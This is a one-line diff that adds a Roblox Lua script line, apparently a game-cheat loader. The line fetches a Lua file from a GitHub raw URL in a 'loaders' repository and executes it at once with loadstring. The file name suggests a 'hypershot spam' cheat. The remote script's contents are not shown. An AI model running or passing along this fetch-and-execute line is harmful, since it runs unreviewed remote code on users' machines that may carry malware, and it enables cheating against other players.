@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/new-mythic-hypershot-spam5-p0a58srzhhhfgj.lua"))()
